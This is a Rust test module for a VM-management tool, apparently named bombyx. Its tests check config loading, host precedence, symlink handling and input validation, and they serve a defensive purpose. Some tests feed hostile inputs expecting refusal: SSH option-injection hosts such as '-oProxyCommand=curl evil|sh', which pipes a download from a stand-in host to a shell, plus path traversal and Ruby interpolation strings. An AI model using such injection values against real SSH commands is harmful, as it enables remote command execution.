        assert!(err.to_string().contains("--host"), "{err}");
    }

    #[test]
    fn a_symlinked_user_config_is_followed() {
        // The symlink refusal exists because a *repo* can commit
        // one beside the project file. Nothing in a clone can
        // touch the operator's own config directory, and every
        // ordinary dotfile manager (stow, chezmoi, a hand-made
        // `ln -s`) symlinks exactly this file -- which made bombyx
        // fail on every subcommand with a message that never
        // mentioned symlinks.
        let (dir, base) = project_dir(&minimal());
        let real = dir.path().join("real-config.toml");
        std::fs::write(&real, "host = \"linked-host\"\n").unwrap();

        let link = dir.path().join(USER_CONFIG_FILE);
        if !symlink_file(&real, &link) {
            // Windows needs a privilege for this; the guarantee is
            // asserted wherever the test can create a link.
            return;
        }

        assert_eq!(
            load(&base, &user_sources(dir.path())).unwrap().host,
            "linked-host"
        );
    }

    #[test]
    fn a_symlinked_project_config_is_still_refused() {
        // The other half of the same rule, and the reason it
        // exists: pointed at a private key, the TOML parse error
        // would echo a line of it to stderr.
        let dir = tempfile::tempdir().unwrap();
        let real = dir.path().join("real.toml");
        std::fs::write(&real, minimal()).unwrap();
        let link = dir.path().join("bombyx.toml");
        if !symlink_file(&real, &link) {
            return;
        }
        assert!(matches!(
            load(&link, &flag_sources("vmhost")).unwrap_err(),
            ConfigError::NotAFile(_)
        ));
    }

    /// Creates a file symlink, or `false` where not permitted.
    fn symlink_file(target: &Path, link: &Path) -> bool {
        #[cfg(windows)]
        let result = std::os::windows::fs::symlink_file(target, link);
        #[cfg(not(windows))]
        let result = std::os::unix::fs::symlink(target, link);
        result.is_ok()
    }

    #[test]
    fn an_empty_host_env_var_counts_as_unset() {
        // An exported-but-empty variable is how a shell says "no
        // value". Taking it literally would report an empty-field
        // error naming a file the operator never edited.
        let (dir, base) = project_dir(&minimal());
        write_user_file(dir.path(), "my-vmhost");
        let sources = HostSources {
            env: Some("  "),
            ..user_sources(dir.path())
        };
        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
    }

    #[test]
    fn a_broken_user_config_is_not_read_when_a_flag_wins() {
        // `--host` has to work on a machine whose per-developer
        // file is missing, unreadable or malformed -- that is
        // half the point of having a flag.
        let (dir, base) = project_dir(&minimal());
        std::fs::write(dir.path().join(USER_CONFIG_FILE), "host = ").unwrap();
        let sources = HostSources {
            flag: Some("mine"),
            user_config_dir: Some(dir.path()),
            ..HostSources::default()
        };
        assert_eq!(load(&base, &sources).unwrap().host, "mine");
    }

    #[test]
    fn a_user_config_rejects_an_unknown_key() {
        // A typo in a file nobody reads twice must be an error,
        // not a setting that silently does nothing.
        let (dir, base) = project_dir(&minimal());
        std::fs::write(dir.path().join(USER_CONFIG_FILE), "hsot = \"x\"\n")
            .unwrap();
        let sources = HostSources {
            user_config_dir: Some(dir.path()),
            ..HostSources::default()
        };
        let err = load(&base, &sources).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains(USER_CONFIG_FILE));
    }

    #[test]
    fn a_projects_table_does_not_stop_the_host_being_read() {
        // The registry carries project entries as well as the
        // host, and `deny_unknown_fields` refuses every key the
        // struct does not name. So a file with both must still
        // give up its host.
        let (dir, base) = project_dir(&minimal());
        std::fs::write(
            dir.path().join(USER_CONFIG_FILE),
            format!(
                "host = \"my-vmhost\"\n\n\
                 [projects.myproject]\n\
                 remote_root = \"~/vms\"\n\
                 {}",
                REQUIRED_TABLES
                    .replace("[vm]", "[projects.myproject.vm]")
                    .replace("[source]", "[projects.myproject.source]")
            ),
        )
        .unwrap();
        let sources = user_sources(dir.path());
        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
    }

    #[test]
    fn a_user_config_without_a_host_is_not_a_host() {
        // The file exists and parses but names nothing, which
        // must read the same as no file at all.
        let (dir, base) = project_dir(&minimal());
        std::fs::write(dir.path().join(USER_CONFIG_FILE), "\n").unwrap();
        let sources = HostSources {
            user_config_dir: Some(dir.path()),
            ..HostSources::default()
        };
        assert!(matches!(
            load(&base, &sources).unwrap_err(),
            ConfigError::HostMissing { .. }
        ));
    }

    #[test]
    fn a_host_from_the_environment_is_still_validated() {
        // The charset check protects the argv, not the repo: every
        // source that can still supply a host reaches `ssh` as
        // its first argument, and a mistake fills any of them
        // in. The file source is covered by
        // `an_invalid_host_names_the_source_that_supplied_it`;
        // this is the environment, which no file check reaches.
        let (dir, base) = project_dir(&minimal());
        let sources = HostSources {
            env: Some("-oProxyCommand=x"),
            ..user_sources(dir.path())
        };
        let err = load(&base, &sources).unwrap_err();
        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
        assert!(err.to_string().contains(HOST_ENV), "{err}");
    }

    /// [`config_dir_from`] against a fixed environment.
    fn config_dir(vars: &[(&str, &str)], windows: bool) -> Option<PathBuf> {
        let owned: Vec<(String, String)> = vars
            .iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect();
        config_dir_from(
            move |key| {
                owned.iter().find(|(k, _)| k == key).map(|(_, v)| v.clone())
            },
            windows,
        )
    }

    #[test]
    fn user_config_dir_prefers_its_env_var_then_the_platform_ones() {
        // The override first, then the platform's own variable.
        assert_eq!(
            config_dir(
                &[
                    (CONFIG_DIR_ENV, "/over"),
                    ("APPDATA", "/app"),
                    ("HOME", "/home/i"),
                ],
                true
            ),
            Some(PathBuf::from("/over"))
        );
        assert_eq!(
            config_dir(
                &[("XDG_CONFIG_HOME", "/xdg"), ("HOME", "/home/i")],
                false
            ),
            Some(Path::new("/xdg").join("bombyx"))
        );
        assert_eq!(
            config_dir(&[("HOME", "/home/i")], false),
            Some(Path::new("/home/i").join(".config").join("bombyx"))
        );
        // Nothing usable in the environment: bombyx cannot guess,
        // and a relative guess would read a host out of the repo.
        assert_eq!(config_dir(&[], false), None);
        assert_eq!(config_dir(&[("APPDATA", "/app")], false), None);
    }

    #[test]
    fn appdata_is_consulted_only_on_windows() {
        // Documented as the Windows location, and it was checked
        // on every platform. `APPDATA` is routinely exported in
        // processes that are not Windows -- under WSL via
        // `WSLENV`, under Wine, in some CI images -- where it beat
        // `$HOME/.config` and made bombyx read a host out of a
        // file the docs said applied only to Windows.
        let vars = [("APPDATA", "/app"), ("HOME", "/home/i")];
        assert_eq!(
            config_dir(&vars, true),
            Some(Path::new("/app").join("bombyx"))
        );
        assert_eq!(
            config_dir(&vars, false),
            Some(Path::new("/home/i").join(".config").join("bombyx"))
        );
        // On Windows the home fallback is *not* used: a machine
        // with no APPDATA is one bombyx should not guess about.
        assert_eq!(config_dir(&[("HOME", "/home/i")], true), None);
    }

    #[test]
    fn a_config_dir_that_is_not_anchored_counts_as_unset() {
        // The whole family, not just the blank case that prompted
        // the guard. Each of these resolves against the working
        // directory -- which for this tool means taking the VM
        // host out of whatever repo bombyx was run in, the one
        // thing this design removes. `..` walks out of the tree,
        // and `C:cfg` is drive-*relative*: it resolves against
        // that drive's current directory.
        for bad in [
            "", "  ", ".", "..", "cfg", "cfg/", "./cfg", "C:cfg", "~/cfg",
        ] {
            assert_eq!(
                config_dir(&[(CONFIG_DIR_ENV, bad), ("HOME", "/h")], false),
                Some(Path::new("/h").join(".config").join("bombyx")),
                "{bad:?} must be ignored"
            );
        }
        // And the anchored spellings that must still work.
        for good in ["/srv/cfg", "\\\\srv\\cfg", "C:/cfg", "d:\\cfg"] {
            assert_eq!(
                config_dir(&[(CONFIG_DIR_ENV, good)], false),
                Some(PathBuf::from(good)),
                "{good:?} must be accepted"
            );
        }
    }

    #[test]
    fn an_oversized_config_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        // `usize::try_from` rather than `as`: the cap is a
        // `u64`, and a bare cast is a truncation waiting for a
        // 32-bit target.
        let over = usize::try_from(MAX_CONFIG_BYTES).unwrap() + 1;
        std::fs::write(&base, "#".repeat(over)).unwrap();

        assert!(matches!(
            load(&base, &flag_sources("vmhost")).unwrap_err(),
            ConfigError::TooLarge(_)
        ));
    }

    #[test]
    fn accepts_a_user_at_host_destination() {
        let host = "igor@vmhost.local";
        assert_eq!(parse_with_host(host).unwrap().host, host);
    }

    #[test]
    fn rejects_invalid_toml() {
        let err = parse("project = ").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("bombyx.toml"));
    }

    #[test]
    fn rejects_missing_required_field() {
        let err = parse("remote_root = \"/srv/v\"\n").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
    }

    /// Every `[vm]` and `[source]` field, with the line that
    /// states it.
    ///
    /// The requiredness tests below omit one entry at a time
    /// and write the rest, so both tables come from here rather
    /// than from a literal in each test. A literal sibling
    /// table is the hazard: adding a required `[source]` field
    /// later would make the `[vm]` test fail on the new field
    /// while its message blamed whichever `[vm]` field it had
    /// omitted.
    const TABLE_FIELDS: [(&str, &str, &str); 7] = [
        ("vm", "provider", "provider = \"libvirt\""),
        ("vm", "box", "box = \"generic/ubuntu2204\""),
        ("vm", "cpus", "cpus = 2"),
        ("vm", "memory", "memory = 2048"),
        ("source", "repo", "repo = \"https://example.invalid/p.git\""),
        ("source", "ref", "ref = \"main\""),
        ("source", "script", "script = \"vagrant/provision.sh\""),
    ];

    /// A project file stating every required field except
    /// `omitted`, which names one entry of [`TABLE_FIELDS`].
    fn config_without(omitted: &str) -> String {
        let mut src = String::from("project = \"myproject\"\n");
        for table in ["vm", "source"] {
            use std::fmt::Write as _;
            let _ = writeln!(src, "\n[{table}]");
            for (owner, field, line) in TABLE_FIELDS {
                if owner == table && field != omitted {
                    src.push_str(line);
                    src.push('\n');
                }
            }
        }
        src
    }

    #[test]
    fn every_vm_and_source_field_is_required() {
        // A table present but incomplete must be an error, not
        // a VM built from a mix of stated and invented values.
        // Nothing enforces this except every field of `Vm` and
        // `Source` being required: a `#[serde(default)]` added
        // to one of them later would turn a half-stated table
        // into a silent default, and the operator would read one
        // value in the file while the guest ran with another.
        //
        // Both tables, because the rule protects a required
        // serde field with no default rather than a table name,
        // and `[source]`'s values are the ones reaching `git` on
        // the guest.
        //
        // Each field is omitted in turn rather than testing one
        // partial table, so a failure names the field that
        // stopped being required instead of only reporting that
        // something did.
        //
        // `parse_project_file` rather than the `parse` helper:
        // the fixture states both tables, so `completed` would
        // leave it alone, and stating them is the point -- the
        // omission has to be visible in the table the test
        // writes.
        for (_, omitted, _) in TABLE_FIELDS {
            let src = config_without(omitted);
            let err =
                parse_project_file(&src, Path::new("bombyx.toml"), "vmhost")
                    .unwrap_err();
            let text = err.to_string();
            assert!(
                matches!(err, ConfigError::Parse { .. }),
                "omitting {omitted}: {text}"
            );
            assert!(
                text.contains("missing field") && text.contains(omitted),
                "omitting {omitted} must be refused by name, got {text}"
            );
        }
    }

    #[test]
    fn rejects_an_unknown_key() {
        // A typo must be reported, not silently defaulted. A
        // silently defaulted key builds the VM to the wrong
        // specification, and the message the operator gets
        // describes the VM rather than the typo.
        let src = "project = \"p\"\n\
                   remote_rot = \"~/vms\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("remote_rot"));
    }

    #[test]
    fn rejects_empty_host() {
        // `--host ""` was typed, so it is reported as an empty
        // field rather than treated as unset.
        let err = parse_with_host("").unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "host" }));
    }

    #[test]
    fn rejects_whitespace_only_project() {
        let src = "project = \"  \"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "project" }));
    }

    #[test]
    fn a_bad_remote_root_in_toml_surfaces_as_a_field_error() {
        // Every `remote_root` rule, and the tests enumerating
        // the family it refuses, live in `config::root`. What
        // this covers is the seam: a value refused there has to
        // come back out of the project-file parse naming the
        // field, so
        // an operator is told which key to edit.
        for (root, want) in [
            ("", "must not be empty"),
            ("vms", "must start with"),
            ("~vms", "must start with"),
            ("/.", "`.` segment"),
            ("~", "at least 1 directory"),
        ] {
            let src = format!("project = \"p\"\nremote_root = \"{root}\"\n");
            let err = parse(&src).unwrap_err();
            assert!(
                matches!(
                    &err,
                    ConfigError::Empty {
                        field: "remote_root"
                    } | ConfigError::Invalid {
                        field: "remote_root",
                        ..
                    }
                ),
                "remote_root {root:?} must be refused, got {err:?}"
            );
            assert!(err.to_string().contains(want), "{root:?}: {err}");
        }
    }

    #[test]
    fn rejects_a_project_that_is_not_one_segment() {
        // The length rule is here with the rest of the segment
        // rules. The registry keys the same value with a type
        // that enforces it, and two guards on one value must not
        // disagree about what they allow.
        for bad in ["../../etc", &"a".repeat(crate::name::MAX_NAME_LEN + 1)] {
            let src = format!("project = {bad:?}\n");
            let err = parse(&src).unwrap_err();
            assert!(
                matches!(
                    err,
                    ConfigError::Invalid {
                        field: "project",
                        ..
                    }
                ),
                "{bad:?} was accepted"
            );
        }
    }

    #[test]
    fn builds_remote_project_dir() {
        assert_eq!(good().remote_project_dir(), "~/vms/myproject");
    }

    #[test]
    fn remote_project_dir_ignores_trailing_slash() {
        let src = "project = \"p\"\nremote_root = \"/srv/\"\n";
        assert_eq!(parse(src).unwrap().remote_project_dir(), "/srv/p");
    }

    #[test]
    fn scratch_dir_is_scoped_to_the_project() {
        // Without the project segment, `scratch pr-1` from
        // two projects lands in one directory and the second
        // boot overwrites the first's `.vagrant/`.
        assert_eq!(
            good().remote_scratch_dir(&scratch("pr-1234")),
            "~/vms/scratch/myproject/pr-1234"
        );
    }

    #[test]
    fn scratch_dirs_of_two_projects_do_not_collide() {
        let a = good();
        let src = "project = \"ledgerstone\"\n";
        let b = parse(src).unwrap();
        let name = scratch("pr-1");
        assert_ne!(a.remote_scratch_dir(&name), b.remote_scratch_dir(&name));
    }

    #[test]
    fn load_reports_missing_file() {
        let path = Path::new("definitely-not-here-bombyx.toml");
        let err = load(path, &flag_sources("vmhost")).unwrap_err();
        assert!(matches!(err, ConfigError::NotFound(_)));
        assert!(err.to_string().contains("config file not found"));
    }

    #[test]
    fn load_reads_an_existing_file() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bombyx.toml");
        std::fs::write(&path, minimal()).unwrap();
        let cfg = load(&path, &flag_sources("vmhost")).unwrap();
        assert_eq!(cfg.project, "myproject");
    }

    #[test]
    fn load_reports_a_directory_as_not_a_file() {
        // Was a `Read` error carrying whatever the OS said,
        // which differs per platform ("Is a directory" on Unix,
        // "Access is denied" on Windows) and explains nothing.
        // The type check that keeps a symlinked project file
        // from being read answers this case first, and says what
        // is actually wrong.
        let dir = tempfile::tempdir().unwrap();
        let err = load(dir.path(), &flag_sources("vmhost")).unwrap_err();
        assert!(matches!(err, ConfigError::NotAFile(_)), "{err:?}");
    }

    /// A project file carrying every required section.
    ///
    /// Tests that exercise one bad field start from this and
    /// replace a line, so a failure names the field under test
    /// rather than a section someone forgot.
    fn full_toml() -> String {
        // The shared tables with `cpus`/`memory` raised, so a
        // test varying one can tell its value from the default.
        format!("project = \"myproject\"\n{REQUIRED_TABLES}")
            .replace("cpus = 2", "cpus = 4")
            .replace("memory = 2048", "memory = 8192")
    }

    fn parse_full(source: &str) -> Result<Config, ConfigError> {
        parse_project_file(source, Path::new("bombyx.toml"), "vmhost")
    }

    #[test]
    fn parses_the_vm_and_source_sections() {
        let cfg = parse_full(&full_toml()).unwrap();
        assert_eq!(cfg.vm.provider, Provider::Libvirt);
        assert_eq!(cfg.vm.box_name, "generic/ubuntu2204");
        assert_eq!(cfg.vm.cpus, 4);
        assert_eq!(cfg.vm.memory, 8192);
        assert_eq!(
            cfg.source.repo.as_str(),
            "https://example.invalid/myproject.git"
        );
        assert_eq!(cfg.source.git_ref, "main");
        assert_eq!(cfg.source.script.as_str(), "vagrant/provision.sh");
    }

    #[test]
    fn requires_both_new_sections() {
        // Neither has a defensible default. A box is the one
        // thing bombyx cannot invent, and a repository bombyx
        // guessed at would be cloned into the guest and run as
        // root.
        //
        // One table removed at a time, and the loop below skips
        // only the named one. Building the input with
        // `take_while` instead would truncate the file at that
        // header, so removing `[vm]` would drop `[source]` too
        // and neither case would be isolated.
        for missing in ["[vm]", "[source]"] {
            let mut source = String::new();
            let mut skipping = false;
            for line in full_toml().lines() {
                if line.starts_with('[') {
                    skipping = line.starts_with(missing);
                }
                if !skipping {
                    source.push_str(line);
                    source.push('\n');
                }
            }
            assert!(
                source.contains(if missing == "[vm]" {
                    "[source]"
                } else {
                    "[vm]"
                }),
                "only {missing} may be removed"
            );
            let err = parse_full(&source).unwrap_err();
            assert!(
                matches!(err, ConfigError::Parse { .. }),
                "a file without {missing} must be refused: {err:?}"
            );
        }
    }

    #[test]
    fn rejects_an_unknown_provider() {
        // Failing at parse rather than at boot: an unknown
        // provider renders a Vagrantfile no vagrant can use,
        // and the error would arrive on the VM host after
        // bombyx had already created a directory there.
        let source = full_toml().replace("libvirt", "virtualbox");
        let err = parse_full(&source).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }), "{err:?}");
    }

    #[test]
    fn rejects_a_machine_with_nothing_to_run_on() {
        // One field at a time, so a guard covering only `cpus`
        // cannot pass by way of the `memory` case.
        for (field, from, to) in [
            ("cpus", "cpus = 4", "cpus = 0"),
            ("memory", "memory = 8192", "memory = 0"),
        ] {
            let source = full_toml().replace(from, to);
            let err = parse_full(&source).unwrap_err();
            assert!(
                matches!(&err, ConfigError::Invalid { field: f, .. }
                    if *f == field),
                "{field}: {err:?}"
            );
        }
    }

    #[test]
    fn rejects_characters_that_would_break_the_generated_file() {
        // These four fields are rendered into a Ruby file. The
        // whole family: a quote closes the literal early, a
        // backslash starts an escape, a control character is
        // never meant, and `#{}` is Ruby interpolation, which
        // is evaluated rather than printed.
        for field in ["box", "repo", "ref", "script"] {
            // `{bad:?}` renders a Rust literal, which is a valid
            // TOML basic string for these three. A control
            // character is not: Rust and TOML spell an escape
            // for one differently, so that case would fail as
            // a parse error before reaching the guard. It is
            // covered directly in `config::vm`'s tests instead.
            for (bad, reason) in [
                ("a\"b", "would end or escape"),
                ("a\\b", "would end or escape"),
                ("a#{1}b", "Ruby interpolation"),
            ] {
                let source: String = full_toml()
                    .lines()
                    .map(|l| {
                        if l.starts_with(&format!("{field} = ")) {
                            format!("{field} = {bad:?}\n")
                        } else {
                            format!("{l}\n")
                        }
                    })
                    .collect();
                // The substitution has to have happened, or this
                // loop would assert nothing at all.
                assert!(
                    source.contains(&format!("{field} = ")),
                    "{field} is not a key in the fixture"
                );
                // The message is asserted, not the variant,
                // because the two differ by field. `repo` and
                // `script` are newtypes checked while serde
                // deserializes, so a bad one arrives wrapped as
                // `Parse`, which also names the line. `box` and
                // `ref` are checked after parsing, as `Invalid`.
                // Both spellings carry the field and the reason.
                //
                // The reason has to be asserted as well as the
                // field. `toml` backticks field names in its own
                // messages, so a field-only check also passes on
                // `missing field` or `unknown field` -- and then
                // this test would go green on a fixture that had
                // drifted, while proving nothing about the guard.
                let err = parse_full(&source).unwrap_err().to_string();
                assert!(
                    err.contains(&format!("`{field}`")) && err.contains(reason),
                    "{field} must refuse {bad:?} with {reason:?}, got {err}"
                );
            }
        }
    }
}

#[cfg(test)]
mod load_project_tests {
    use std::path::Path;

    use super::*;

    /// [`Config::load_project`] against a registry given as
    /// text, keeping the [`HostOrigin`] `Config::parse` drops.
    ///
    /// No file is written. `Config::load_project`'s own reading
    /// is covered by the two tests that do write one, and every
    /// test about ranking or assembly goes through here.
    fn load(
        source: &str,
        name: &str,
        sources: &HostSources,
    ) -> Result<(Config, HostOrigin), ConfigError> {
        let registry = registry::parse(source, Path::new(USER_CONFIG_FILE))?;
        Config::from_registry(&registry, name, sources)
    }

    /// A registry naming one project and nothing unusual.
    fn plain() -> String {
        test_registry("myproject", "vmhost", None)
    }

    #[test]
    fn every_setting_comes_out_of_the_entry() {
        let (cfg, origin) =
            load(&plain(), "myproject", &HostSources::default()).unwrap();

        // The table key becomes the project name: the entry does
        // not carry one, so the two cannot disagree.
        assert_eq!(cfg.project, "myproject");
        assert_eq!(cfg.host, "vmhost");
        // Absent from the entry, so the same default a
        // `bombyx.toml` gets.
        assert_eq!(cfg.remote_root, DEFAULT_REMOTE_ROOT);
        assert_eq!(cfg.vm.provider, Provider::Libvirt);
        assert_eq!(cfg.vm.box_name, "generic/ubuntu2204");
        assert_eq!(cfg.vm.cpus, 2);
        assert_eq!(cfg.vm.memory, 2048);
        assert_eq!(cfg.source.git_ref, "main");
        assert_eq!(cfg.source.script.as_str(), "vagrant/provision.sh");
        // The entry names no host of its own, so the file-wide
        // key won.
        assert_eq!(origin, HostOrigin::UserFile);
    }

    #[test]
    fn the_entrys_own_host_outranks_the_file_wide_one() {
        let source = test_registry("myproject", "file-wide", Some("entry"));
        let (cfg, origin) =
            load(&source, "myproject", &HostSources::default()).unwrap();
        assert_eq!(cfg.host, "entry");
        assert_eq!(
            origin,
            HostOrigin::ProjectEntry(
                crate::name::ProjectName::parse("myproject").unwrap()
            )
        );
    }

    #[test]
    fn the_host_is_ranked_for_the_project_being_loaded() {
        // `HostSources.project` names one project and the load
        // names another. The settings and the host have to come
        // from the same entry: taking the host from `other`
        // would boot `myproject`'s VM on `other`'s machine, and
        // `destroy` would `rm -rf` there.
        let source = format!(
            "{}\n{}",
            test_registry("myproject", "file-wide", Some("mine")),
            test_entry("other", Some("theirs"))
        );
        let sources = HostSources {
            project: Some("other"),
            ..HostSources::default()
        };
        let (cfg, origin) = load(&source, "myproject", &sources).unwrap();
        assert_eq!(cfg.host, "mine");
        assert_eq!(
            origin,
            HostOrigin::ProjectEntry(
                crate::name::ProjectName::parse("myproject").unwrap()
            )
        );
    }

    #[test]
    fn the_flag_still_outranks_the_file() {
        let sources = HostSources {
            flag: Some("from-flag"),
            ..HostSources::default()
        };
        let (cfg, origin) = load(
            &test_registry("myproject", "vmhost", Some("entry")),
            "myproject",
            &sources,
        )
        .unwrap();
        assert_eq!(cfg.host, "from-flag");
        assert_eq!(origin, HostOrigin::Flag);
    }

    #[test]
    fn a_host_from_the_flag_that_ssh_would_read_as_an_option() {
        // The winning source is checked, whichever it is, and
        // the message names that source rather than the field:
        // `--host` is not a key anyone can edit in a file.
        let sources = HostSources {
            flag: Some("-oProxyCommand=curl evil|sh"),
            ..HostSources::default()
        };
        let err = load(&plain(), "myproject", &sources).unwrap_err();
        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
        let text = err.to_string();
        assert!(text.contains("--host"), "{text}");
    }

    #[test]
    fn a_broken_entry_is_refused_even_when_the_flag_names_the_host() {
        // Every run checks the entry, not only a run that goes
        // to the file for its host. `--host` here means the
        // ranking stops at the flag and never reads a key out of
        // the registry, and the `cpus = 0` in it is still
        // refused -- otherwise bombyx would boot a VM from a
        // description nothing had checked.
        let source = plain().replace("cpus = 2", "cpus = 0");
        let sources = HostSources {
            flag: Some("from-flag"),
            ..HostSources::default()
        };
        let err = load(&source, "myproject", &sources).unwrap_err();
        let text = err.to_string();
        assert!(text.contains("cpus"), "{text}");
    }

    #[test]
    fn a_broken_entry_is_reported_before_a_missing_host() {
        // Both are wrong at once: the entry says `cpus = 0` and
        // no source names a host. The entry is read first, so
        // the entry's problem is what the operator is told
        // about. It is the one they can act on with the file
        // already open, and the host message would send them to
        // that same file for a second edit.
        let source =
            test_entry("myproject", None).replace("cpus = 2", "cpus = 0");
        let err =
            load(&source, "myproject", &HostSources::default()).unwrap_err();
        let text = err.to_string();
        assert!(text.contains("cpus"), "{text}");
        assert!(
            !matches!(err, ConfigError::HostMissing { .. }),
            "the host message wins only if the entry is read second: {text}"
        );
    }

    #[test]
    fn a_name_with_no_table_names_the_table_to_write() {
        let err =
            load("host = \"vmhost\"\n", "myproject", &HostSources::default())
                .unwrap_err();
        assert!(matches!(err, ConfigError::ProjectNotFound { .. }), "{err}");
        let text = err.to_string();
        assert!(text.contains("[projects.myproject]"), "{text}");
    }

    #[test]
    fn the_registry_file_is_read_from_the_config_directory() {
        // The one test that goes through the file, so
        // `Config::load_project`'s own reading is exercised
        // rather than only the assembly below it.
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(USER_CONFIG_FILE), plain()).unwrap();
        let sources = HostSources {
            user_config_dir: Some(dir.path()),
            ..HostSources::default()
        };
        let (cfg, origin) =
            Config::load_project("myproject", &sources).unwrap();
        assert_eq!(cfg.project, "myproject");
        assert_eq!(cfg.host, "vmhost");
        assert_eq!(origin, HostOrigin::UserFile);
    }

    #[test]
    fn no_registry_file_says_which_file_to_create() {
        // The directory exists and the file does not, which is
        // every machine bombyx has never run on.
        let dir = tempfile::tempdir().unwrap();
        let sources = HostSources {
            user_config_dir: Some(dir.path()),
            ..HostSources::default()
        };
        let err = Config::load_project("myproject", &sources).unwrap_err();
        assert!(matches!(err, ConfigError::RegistryNotFound { .. }), "{err}");
        let text = err.to_string();
        // The path to create, and what goes in it. A message
        // with only the first leaves the operator with an empty
        // file.
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
        assert!(text.contains("[projects.myproject]"), "{text}");
    }

    #[test]
    fn no_config_directory_describes_the_file_instead() {
        // Nothing in the environment names a config directory,
        // so there is no path to print and the message describes
        // the file. `registry_place` decides both wordings.
        let err = Config::load_project("myproject", &HostSources::default())
            .unwrap_err();
        assert!(matches!(err, ConfigError::RegistryNotFound { .. }), "{err}");
        let text = err.to_string();
        assert!(text.contains("config directory"), "{text}");
        assert!(text.contains("[projects.myproject]"), "{text}");
    }
}
